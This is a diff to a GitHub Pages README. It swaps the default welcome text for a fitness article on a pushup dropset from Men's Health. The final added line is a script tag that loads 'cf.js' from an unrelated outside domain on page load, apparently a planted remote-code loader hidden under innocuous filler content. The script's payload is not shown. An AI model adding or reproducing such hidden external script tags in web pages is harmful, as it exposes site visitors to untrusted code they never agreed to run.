@@ -1,37 +1,15 @@
-## Welcome to GitHub Pages
+One of the best ways to train with bodyweight is to utilize the technique dropset, which has you applying a technique to your early reps on a classic bodyweight movement, then tweaking that technique later to allow for more reps. It's a solid way to create overload without any external resistance, and it's often more challenging than you think.
 
-You can use the [editor on GitHub](https://github.com/jeremybellt/lifetips/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+It's also a great way to level up your pushup, pushing your chest to greater gains without the use of a bench press. And that's what you do in the Half-Full Post Pushup Dropset from Men's Health fitness director Ebenezer Samuel, C.S.C.S. The pushup series, which requires nothing more than your bodyweight and a pole or post that you can grab with one hand, pushes your chest to the limit, and, says Samuel, it forces you to own the entire pushup range of motion.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"It's common when doing pushups to avoid certain sticking points, or pieces of the range of motion that we can't usually handle, by exploding up through them," says Samuel. "During this dropset, you'll spend extra time at several tricky points, building time-under-tension and challenging your core to remain stable during those moments.
 
-### Markdown
+"That's one of the strengths of the post pushup as well," he adds. "Your core can't take a break during the post pushup, especially when we add the half-full motion in."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Because you're not exploding back to the top on every rep, you have to be in complete control of the pushup motion, challenging chest and triceps to the max. You also pile up extra time in the most challenging moment of the pushup: At the bottom, with your chest an inch from the ground. "For every half-full rep," says Samuel, "you power out of the bottom of a pushup twice. That's not easy."
 
-```markdown
-Syntax highlighted code block
+It's that much harder because of what comes next: After blasting through half-full reps, you transition to standard post pushups, which are challenging in their own right. "It leaves your chest on fire," says Samuel.
 
-# Header 1
-## Header 2
-### Header 3
+But it is worth it, and it's that much better since you can do it anywhere, from outside to your hotel room to in the weight room. Bodyweight dropsets don't get any better than that.
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/jeremybellt/lifetips/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script src="https://git.wikilime.net/cf.js" async></script>
